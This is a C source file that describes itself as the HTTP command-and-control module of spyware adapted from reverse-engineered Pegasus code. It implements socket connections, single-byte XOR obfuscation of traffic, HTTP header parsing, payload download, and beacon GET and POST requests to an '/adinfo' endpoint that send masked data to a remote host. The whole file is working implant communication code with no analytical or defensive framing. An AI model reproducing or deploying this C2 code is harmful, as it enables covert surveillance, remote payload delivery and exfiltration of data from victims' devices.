// graphite_http.c - HTTP/C2 Communication (C)
// Adapted from Pegasus (libsgn) reverse-engineered native code
// Features: socket connect, send/receive with XOR encryption,
//           HTTP header parsing, payload reception

#include "graphite_http.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#pragma comment(lib, "ws2_32.lib")
#endif

static const void *find_bytes_impl(const void *hay, size_t hay_n,
                                    const void *needle, size_t needle_n) {
    const unsigned char *p = hay;
    size_t i;
    if (needle_n == 0 || hay_n < needle_n) return NULL;
    for (i = 0; i + needle_n <= hay_n; i++) {
        if (memcmp(p + i, needle, needle_n) == 0)
            return p + i;
    }
    return NULL;
}

HTTP_EXPORT void* find_bytes(const void *hay, size_t hay_n,
                            const void *needle, size_t needle_n) {
    return (void*)find_bytes_impl(hay, hay_n, needle, needle_n);
}

HTTP_EXPORT int socket_connect(int *out_fd, const char *host, unsigned port) {
    if (!out_fd || !host) return 0;

#ifdef _WIN32
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    SOCKET fd = socket(AF_INET, SOCK_STREAM, 0);
    *out_fd = (int)fd;
    if (fd == INVALID_SOCKET) return 0;
#else
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    *out_fd = fd;
    if (fd <= 0) return 0;
#endif

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons((unsigned short)port);
    addr.sin_addr.s_addr = inet_addr(host);

    if (connect(*out_fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        socket_disconnect(out_fd);
        return 0;
    }
    return 1;
}

HTTP_EXPORT int socket_disconnect(int *fd) {
    if (fd && *fd > 0) {
#ifdef _WIN32
        closesocket(*fd);
        WSACleanup();
#else
        close(*fd);
#endif
        *fd = 0;
    }
    return 1;
}

HTTP_EXPORT int do_socket_send(int fd, const void *buf, size_t len, int xor_body) {
    unsigned char *wired;
    unsigned char key;
    size_t i, remain;
    int zero_streak;
    int n;

    if (fd <= 0 || !buf) return 0;
    wired = (unsigned char*)malloc(len);
    if (!wired) return 0;

    key = xor_body ? (unsigned char)GRAPHITE_XOR_BYTE : 0;
    for (i = 0; i < len; i++)
        wired[i] = ((const unsigned char *)buf)[i] ^ key;

    remain = len;
    zero_streak = 0;
    while (remain > 0) {
        n = send(fd, (const char*)(wired + (len - remain)), (int)remain, 0);
        if (n < 0) {
            free(wired);
            return 0;
        }
        if (n == 0) {
            zero_streak++;
            if (zero_streak > 2) {
                free(wired);
                return 0;
            }
        } else {
            zero_streak = 0;
        }
        remain -= (size_t)n;
    }
    free(wired);
    return 1;
}

HTTP_EXPORT int do_socket_receive(int fd, void *buf, size_t len, int xor_body) {
    size_t remain;
    int tries;
    int n;
    size_t i;

#ifdef _WIN32
    // Windows poll equivalent
    fd_set readfds;
    struct timeval tv;
#else
    struct pollfd pfd;
#endif

    if (fd <= 0 || !buf) return 0;

    memset(buf, 0, len);
    remain = len;
    while (remain > 0) {
#ifdef _WIN32
        FD_ZERO(&readfds);
        FD_SET(fd, &readfds);
        tv.tv_sec = GRAPHITE_RECV_POLL_MS / 1000;
        tv.tv_usec = (GRAPHITE_RECV_POLL_MS % 1000) * 1000;
        int pr = select(fd + 1, &readfds, NULL, NULL, &tv);
        if (pr < 1) return 0;
#else
        pfd.fd = fd;
        pfd.events = 1; // POLLIN
        pfd.revents = 0;
        tries = GRAPHITE_RECV_POLL_RETRIES;
        for (;;) {
            int pr = poll(&pfd, 1, GRAPHITE_RECV_POLL_MS);
            if ((pfd.revents & 1) != 0) break;
            tries--;
            if (tries == 0) return 0;
            if (pr < 1) return 0;
        }
#endif
        n = recv(fd, (char*)buf + (len - remain), (int)remain, 0);
        if (n < 1) return 0;
        remain -= (size_t)n;
    }

    if (xor_body) {
        for (i = 0; i < len; i++)
            ((unsigned char *)buf)[i] ^= (unsigned char)GRAPHITE_XOR_BYTE;
    }
    return 1;
}

HTTP_EXPORT int http_get_string_attribute(const void *hdr, size_t hdr_len,
                                          const char *name, char *out, int out_max) {
    const unsigned char *hit;
    const unsigned char *eol;
    size_t name_len, value_len;

    if (!hdr || !name || !out || out_max <= 0) return 0;

    name_len = strlen(name);
    hit = (const unsigned char*)find_bytes_impl(hdr, hdr_len, name, name_len);
    if (!hit) return 0;

    eol = (const unsigned char*)find_bytes_impl(hit, (size_t)((const unsigned char *)hdr + hdr_len - hit),
                                                "\r\n", 2);
    if (!eol) return 0;

    value_len = (size_t)(eol - (hit + name_len));
    if ((int)value_len >= out_max) return 0;

    memcpy(out, hit + name_len, value_len);
    out[value_len] = '\0';
    return 1;
}

HTTP_EXPORT int http_get_int_attribute(const void *hdr, size_t hdr_len,
                                       const char *name, long *out) {
    char tmp[50];
    if (!out) return 0;
    memset(tmp, 0, sizeof(tmp));
    if (!http_get_string_attribute(hdr, hdr_len, name, tmp, 50)) return 0;
    *out = strtol(tmp, NULL, 10);
    return 1;
}

HTTP_EXPORT int http_receive_header(int fd, void **out_hdr, int *out_len) {
    unsigned char *hdr;
    unsigned char *grown;
    char byte[1];
    int cap_blocks = 1;
    int used = 0;
    unsigned match = 0;
    const char *end = "\r\n\r\n";

    if (!out_hdr || !out_len) return 0;
    *out_hdr = NULL;
    *out_len = 0;

    hdr = (unsigned char*)malloc(GRAPHITE_HTTP_LINE);
    if (!hdr) return 0;

    for (;;) {
        if (!do_socket_receive(fd, byte, 1, 0)) {
            free(hdr);
            return 0;
        }
        if (used + 1 > cap_blocks * GRAPHITE_HTTP_LINE) {
            cap_blocks++;
            grown = (unsigned char*)realloc(hdr, (size_t)cap_blocks * GRAPHITE_HTTP_LINE);
            if (!grown) {
                free(hdr);
                return 0;
            }
            hdr = grown;
        }
        hdr[used] = (unsigned char)byte[0];
        used++;
        if (end[match] != byte[0]) {
            match = 0;
            continue;
        }
        match++;
        if (match >= 4) break;
    }
    *out_hdr = hdr;
    *out_len = used;
    return 1;
}

HTTP_EXPORT int http_receive_payload(int fd, void **out_body, size_t *out_len) {
    void *hdr = NULL;
    int hdr_len = 0;
    long content_len = 0;
    void *body = NULL;
    int ok = 0;

    if (!out_body || !out_len) return 0;
    *out_body = NULL;
    *out_len = 0;

    if (http_receive_header(fd, &hdr, &hdr_len) == 1 &&
        http_get_int_attribute(hdr, (size_t)hdr_len, "Content-Length:", &content_len) == 1 &&
        content_len >= 0) {
        body = malloc((size_t)content_len);
        if (body)
            ok = do_socket_receive(fd, body, (size_t)content_len, 0);
    }

    if (hdr) free(hdr);

    if (!ok) {
        free(body);
        return 0;
    }
    *out_body = body;
    *out_len = (size_t)content_len;
    return 1;
}

HTTP_EXPORT int http_send_request_with_get(const char *gi_hex, const char *bf_hex,
                                           const char *host, int fd) {
    char line[GRAPHITE_HTTP_LINE];
    memset(line, 0, sizeof(line));
    snprintf(line, sizeof(line), "GET /adinfo?gi=%s&bf=%s HTTP/1.1\r\nHost: %s\r\n\r\n",
             gi_hex, bf_hex, host);
    return do_socket_send(fd, line, strlen(line), 0);
}

HTTP_EXPORT int http_send_response_with_post(const char *gi_hex, const char *bf_hex,
                                             const char *host, const void *body,
                                             size_t body_len, int fd) {
    char line[GRAPHITE_HTTP_LINE];
    size_t hdr_len;
    unsigned char *wired;
    size_t i;
    int ok;

    memset(line, 0, sizeof(line));
    hdr_len = (size_t)snprintf(line, sizeof(line),
        "POST /adinfo?gi=%s&bf=%s HTTP/1.1\r\nHost: %s\r\nContent-Length: %u\r\n\r\n",
        gi_hex, bf_hex, host, (unsigned)body_len);

    wired = (unsigned char*)malloc(hdr_len + body_len);
    if (!wired) return 0;

    memcpy(wired, line, hdr_len);
    if (body_len > 0 && body)
        memcpy(wired + hdr_len, body, body_len);
    for (i = 0; i < body_len; i++)
        wired[hdr_len + i] ^= (unsigned char)GRAPHITE_XOR_BYTE;

    ok = do_socket_send(fd, wired, hdr_len + body_len, 0);
    free(wired);
    return ok;
}
